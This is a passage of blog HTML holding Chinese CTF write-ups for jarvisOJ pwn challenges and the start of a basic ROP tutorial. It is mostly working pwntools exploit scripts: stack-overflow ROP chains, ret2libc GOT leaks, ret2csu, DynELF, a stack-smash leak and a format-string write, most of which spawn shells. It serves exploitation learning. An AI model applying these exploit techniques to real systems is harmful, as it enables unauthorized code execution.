pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="string">"9882"</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x4004c0</span></span><br><span class="line">bin_sh = <span class="number">0x600a90</span></span><br><span class="line">rdi_pop_addr = <span class="number">0x4006b3</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x88</span> + p64(rdi_pop_addr) + p64(bin_sh) + p64(system_addr)</span><br><span class="line">p.recvuntil(<span class="string">"Input:"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>checksec</p><p><img alt="" data-src="/2019/05/19/jarvisOJ解题记录之pwn/21.JPG" class="lazyload"></p><p>IDA查看程序</p><p><img alt="" data-src="/2019/05/19/jarvisOJ解题记录之pwn/22.JPG" class="lazyload"></p><p>发现栈溢出，但是程序中没有可以直接利用的函数。但是有write函数，write函数可以输出write函数在got表中的地址，从而可以计算出system函数和“/bin/sh”的地址。</p><p>首先找到write函数的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">" pwn2.jarvisoj.com"</span>,<span class="string">"9879"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level3"</span>)</span><br><span class="line">write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x88</span> + <span class="string">'aaaa'</span> + p32(write_plt) + p32(vun_addr) +  p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure><p>完整exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="string">"9879"</span>)</span><br><span class="line"><span class="comment">#p = process("./level3")</span></span><br><span class="line">elf = ELF(<span class="string">"./level3"</span>)</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">vun_addr = <span class="number">0x0804844b</span></span><br><span class="line">write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x88</span> + <span class="string">'aaaa'</span> + p32(write_plt) + p32(vun_addr) +  p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> hex(write_addr)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.19.so'</span>)</span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr = libc_base + next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span> * <span class="number">140</span> + p32(system_addr) + <span class="string">"aaaa"</span>+ p32(binsh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="level3-x64"><a href="#level3-x64" class="headerlink" title="level3_x64"></a>level3_x64</h3><p>利用write函数泄露got表需要三个参数，在64位程序中，前三个参数分别存在rdi、rsi、rdx中，因此可以利用ret2csu。exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="string">"9883"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./level3_x64"</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">csu_front_addr = <span class="number">0x400690</span></span><br><span class="line">csu_end_addr = <span class="number">0x4006aa</span></span><br><span class="line">fakeebp = <span class="string">'b'</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, last)</span>:</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r13</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x80</span> + fakeebp</span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">csu(<span class="number">0</span>,<span class="number">1</span>,write_got,<span class="number">8</span>,write_got,<span class="number">1</span>,main_addr)</span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> hex(write_addr)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc-2.19.so"</span>)</span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr = libc_base + next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line"><span class="keyword">print</span> hex(system_addr)</span><br><span class="line"><span class="keyword">print</span> hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line"><span class="comment">#csu(0, 1, system_addr, 0, 0, binsh_addr, main_addr)  ##可能binsh_addr的内容超过8字节，打不通</span></span><br><span class="line">rdi = <span class="number">0x4006b3</span>  <span class="comment">#ROPgadget 得到</span></span><br><span class="line">payload2 = <span class="string">'a'</span> * <span class="number">0x80</span> + fakeebp</span><br><span class="line">payload2 += p64(rdi) + p64(binsh_addr)</span><br><span class="line">payload2 += p64(system_addr) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>这道题是对无libc的栈溢出的考察，pwntools有Dynelf工具可以解决这类问题。具体攻击思路</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用write函数泄露出system的地址，将&quot;/bin/sh&quot;写入./bss段中，最后通过构造栈空间使system调用&quot;/bin/sh&quot;从而拿到shell</span><br></pre></td></tr></table></figure><p>首先利用write泄露system地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">"./level4"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x90</span> + p32(write_addr) + p32(vun_addr) + p32(<span class="number">1</span>) + p32(addr) + p32(<span class="number">4</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">d = DynELF(leak,elf)</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br></pre></td></tr></table></figure><p>然后将”/bin/sh”写入.bss</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x90</span> + p32(read_addr) + p32(vun_addr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.senline(<span class="string">"/bin/sh\x00"</span>)</span><br></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="string">"9880"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./level4"</span>)</span><br><span class="line">write_addr = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">vun_addr = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line">bss_addr = elf.symbols[<span class="string">'__bss_start'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(bss_addr)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x8c</span> + p32(write_addr) + p32(vun_addr) + p32(<span class="number">1</span>) + p32(addr) + p32(<span class="number">4</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">d = DynELF(leak,elf = ELF(<span class="string">"./level4"</span>))</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line">exit_addr = d.lookup(<span class="string">'exit'</span>,<span class="string">'libc'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>* <span class="number">0x8c</span> + p32(read_addr) + p32(vun_addr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x8c</span> + p32(system_addr) + p32(exit_addr) + p32(bss_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考链接</p><p><a href="https://www.anquanke.com/post/id/85129" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85129</a></p><p><a href="https://www.freebuf.com/articles/system/193646.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/193646.html</a></p><h3 id="Test-Your-Memory"><a href="#Test-Your-Memory" class="headerlink" title="Test Your Memory"></a>Test Your Memory</h3><p>ret2libc，具体思路和方法与level2相似，exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="string">"9876"</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x08048440</span></span><br><span class="line">catflag = <span class="number">0x080487e0</span></span><br><span class="line">main = <span class="number">0x080485d0</span></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x13</span>+<span class="number">4</span>) + p32(system) + p32(main) + p32(catflag)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Tell-Me-Something"><a href="#Tell-Me-Something" class="headerlink" title="Tell Me Something"></a>Tell Me Something</h3><p>checksec, 64位程序，NX开启</p><p><img alt="" data-src="/2019/05/19/jarvisOJ解题记录之pwn/7.JPG" class="lazyload"></p><p>ida查看</p><p><img alt="" data-src="/2019/05/19/jarvisOJ解题记录之pwn/8.JPG" class="lazyload"></p><p>栈溢出，用good_game地址覆盖掉函数返回地址，找出返回地址的位置</p><p><img alt="" data-src="/2019/05/19/jarvisOJ解题记录之pwn/9.JPG" class="lazyload"></p><p>查看main函数的汇编代码，没有rbp入栈，因此填充长度为0x88，编写exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"pwn.jarvisoj.com"</span>, <span class="string">"9876"</span>)</span><br><span class="line"></span><br><span class="line">good_game = <span class="number">0x400620</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x88</span> + p64(good_game)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Smashes"><a href="#Smashes" class="headerlink" title="Smashes"></a>Smashes</h3><p>checksec，开启栈溢出保护，NX，fortify</p><p><img alt="" data-src="/2019/05/19/jarvisOJ解题记录之pwn/10.JPG" class="lazyload"></p><p>根据以上信息，这是一种基于stack smash的花式栈溢出。也就是：当发生栈溢出时，<code>__stack_chk_fail</code> 函数会打印出报错信息，报错信息中包含argv[0],而argv[0]是保存在栈中的，因此我们可以将想要的内容的地址覆盖掉argv[0]地址即可</p><p>ida查看程序</p><p><img alt="" data-src="/2019/05/19/jarvisOJ解题记录之pwn/11.JPG" class="lazyload"></p><p>_IO_getc函数会产生栈溢出，while循环中：flag会被overwrite，查看0x600d20的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000600D20 byte_600D20     db 50h                  ; DATA XREF: sub_4007E0+6Ew</span><br><span class="line">.data:0000000000600D21 aCtfHereSTheFla db &apos;CTF&#123;Here&apos;,27h,&apos;s the flag on server&#125;&apos;,0</span><br></pre></td></tr></table></figure><p>说明0x600d20是最初flag地址，但是该内容会被覆盖掉。这时候我们就需要利用一个技巧了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用 gdb 的 find 来进行查找。</span><br></pre></td></tr></table></figure><p>在memset处下断点:b *400873</p><p><img alt="" data-src="/2019/05/19/jarvisOJ解题记录之pwn/12.JPG" class="lazyload"></p><p>接下来找argv[0]的地址，在main函数处下断点:b *4006d0</p><p><img alt="" data-src="/2019/05/19/jarvisOJ解题记录之pwn/13.JPG" class="lazyload"></p><p>找到argv[0]地址0x7fffffffe288，查看canary保护的汇编代码</p><p><img alt="" data-src="/2019/05/19/jarvisOJ解题记录之pwn/15.JPG" class="lazyload"></p><p>在__IO_gets处下断点：b *40080e,然后计算argv[0]的偏移</p><p><img alt="" data-src="/2019/05/19/jarvisOJ解题记录之pwn/16.JPG" class="lazyload"></p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"pwn.jarvisoj.com"</span>, <span class="string">"9877"</span>)</span><br><span class="line"></span><br><span class="line">good_game = <span class="number">0x400d20</span></span><br><span class="line">p.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">536</span> + p64(good_game)</span><br><span class="line"><span class="comment">#payload = p64(good_game)*300   ##盲打</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">"flag:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Guess"><a href="#Guess" class="headerlink" title="Guess"></a>Guess</h3><p>checksec,NX开启</p><p><img alt="" data-src="/2019/05/19/jarvisOJ解题记录之pwn/17.JPG" class="lazyload"></p><p>IDA查看程序</p><p><img alt="" data-src="/2019/05/19/jarvisOJ解题记录之pwn/18.JPG" class="lazyload"></p><p>inbuf[4096],fgets(inbuf,4096,stdin),无栈溢出，继续查看is_flag_correct（inbuf）</p><p><img alt="" data-src="/2019/05/19/jarvisOJ解题记录之pwn/19.JPG" class="lazyload"></p><p>从后往前看，需要diff=0，因此需要flag和given_flag相等，given_flag与value相关，value值受bin_by_hex控制。整个程序逻辑为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入50个字符的十六进制，即100个十六进制字符。通过bin_by_hex，将100个十六进制字符转化为50个字符串存到given_flag中，最后比较真实的flag与given_flag的值。例如：输入&quot;313233&quot;，通过bin_by_hex就会生成&quot;123&quot;</span><br></pre></td></tr></table></figure><p>查看函数栈结构</p><p><img alt="" data-src="/2019/05/19/jarvisOJ解题记录之pwn/20.JPG" class="lazyload"></p><p>可以看到flag的地址比bin_by_hex低，再看value，发现漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">value1 = bin_by_hex[flag_hex[2*i]];   ##flag_hex为输入值</span><br><span class="line">value2 = bin_by_hex[flag_hex[2*i+1]];</span><br><span class="line">given_flag[i] = value2 | value1*16;</span><br></pre></td></tr></table></figure><p>flag_hex为char型，可以控制flag_hex为负数，这是value值可以为flag中的值，当value1=0时，given_flag就等于value2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">128 + 64 : -64</span><br><span class="line">128 + 64 + i :64+i</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">payload+=<span class="string">'0'</span></span><br><span class="line">payload+=chr(<span class="number">128</span>+i+<span class="number">64</span>)</span><br></pre></td></tr></table></figure><p>这样就可以使given_flag的值等于flag，但是还是无法知道具体的值，于是爆破，exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"pwn.jarvisoj.com"</span>,<span class="string">"9878"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">payload+=<span class="string">'0'</span></span><br><span class="line">payload+=chr(<span class="number">128</span>+i+<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">t = list(payload)</span><br><span class="line"><span class="comment">#l = "0123456789abcdef"</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> string.printable:</span><br><span class="line">t[<span class="number">2</span>*i] = j.encode(<span class="string">"hex"</span>)[<span class="number">0</span>]</span><br><span class="line">t[<span class="number">2</span>*i+<span class="number">1</span>] = j.encode(<span class="string">"hex"</span>)[<span class="number">1</span>]</span><br><span class="line">p.sendline(<span class="string">""</span>.join(t))</span><br><span class="line">re = p.recvline()</span><br><span class="line"><span class="keyword">if</span> <span class="string">"Yaaaa"</span> <span class="keyword">in</span> re:</span><br><span class="line">flag += j</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="fm"><a href="#fm" class="headerlink" title="fm"></a>fm</h3><p>这是一道格式化字符串的内存覆盖，详细过程<a href="https://j-kangel.github.io/2019/05/01/PWN%E5%AD%A6%E4%B9%A0%E4%B9%8Bfmtstr/#more">https://j-kangel.github.io/2019/05/01/PWN%E5%AD%A6%E4%B9%A0%E4%B9%8Bfmtstr/#more</a></p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="string">"9895"</span>)</span><br><span class="line"></span><br><span class="line">x_addr = <span class="number">0x0804a02c</span></span><br><span class="line">payload = p32(x_addr) + <span class="string">"%11$n"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> jarvisOJ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PWN学习之基本ROP</title>
      <link href="/2019/05/18/PWN%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%9F%BA%E6%9C%ACROP/"/>
      <url>/2019/05/18/PWN%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%9F%BA%E6%9C%ACROP/</url>
      
        <content type="html"><![CDATA[<h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>首先checksec，查看保护</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/1.JPG" class="lazyload"></p><p>开启了NX保护，IDA查看程序</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/2.JPG" class="lazyload"></p><p>很明显存在栈溢出漏洞，继续查看程序，发现有一处调用shell</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/3.JPG" class="lazyload"></p><p>想要程序调用system函数，需要input==secretcode，而secretcode每次都是随机的，所以只能通过栈溢出，让main函数的返回值为调用system函数的地方，查看该函数所在的位置</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/4.JPG" class="lazyload"></p><p>0x0804863A，接下来是找到函数返回的地址，并将其覆盖</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/5.JPG" class="lazyload"></p><p>0xffffd338-0xffffd2cc = 108，于是构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2text"</span>)</span><br><span class="line">addr = <span class="number">0x0804863A</span></span><br><span class="line">payload = (<span class="number">108</span>+<span class="number">4</span>) * <span class="string">'a'</span> + p32(addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>例题：jarvisOJ level0</p><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>首先checksec</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/6.JPG" class="lazyload"></p><p>32位程序，没有开启任何保护，IDA查看程序</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/7.JPG" class="lazyload"></p><p>有栈溢出，例外，strncpy()函数将gets的内容写入buf2中。于是攻击思路如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将shellcode写入buf2中，然后利用栈溢出将函数返回地址覆盖为buf2的地址。例外有一点需要注意的是，shellcode长度不能超过0x64，buf2部分可写可执行</span><br></pre></td></tr></table></figure><p>查看buf2的地址</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/8.JPG" class="lazyload"></p><p>可以看到buffer位于.bss段的0x0804A080处，接下来查看此处地址的权限</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/9.JPG" class="lazyload"></p><p>vmmap查看内存，0xa080+0x64=0xa0c4，有可写可读可执行权限。于是构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2shellcode"</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">print</span> shellcraft.sh()</span><br><span class="line"><span class="keyword">print</span> hex(len(shellcode))   <span class="comment">#0x2c</span></span><br><span class="line">buf = <span class="number">0x0804a080</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">112</span>,<span class="string">'a'</span>) + p32(buf)</span><br><span 